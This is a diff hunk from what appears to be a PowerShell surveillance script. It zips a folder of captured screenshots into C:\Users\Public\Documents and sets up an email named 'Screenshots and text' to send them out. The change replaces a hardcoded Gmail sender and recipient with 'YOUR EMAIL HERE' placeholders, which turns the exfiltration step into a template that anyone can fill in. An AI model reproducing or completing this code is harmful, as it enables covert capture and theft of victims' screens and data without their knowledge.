@@ -81,8 +81,8 @@ Compress-Archive -Path "C:\Users\Public\Documents\Screen" -DestinationPath "C:\U
 $allfiles += "C:\Users\Public\Documents\Screen.zip"
 echo "these are all files $allfiles"
  #############################################Send an email with the screenshots and Text file#######################################################################################################################################################
-$EmailFrom = "098itauscript098@gmail.com"                
-$EmailTo = "098itauscript098@gmail.com"
+$EmailFrom = "YOUR EMAIL HERE"                
+$EmailTo = "YOUR EMAIL HERE"
             
 $EmailSubject = "Powershell" 
 $EmailBody = "Screenshots and text" 
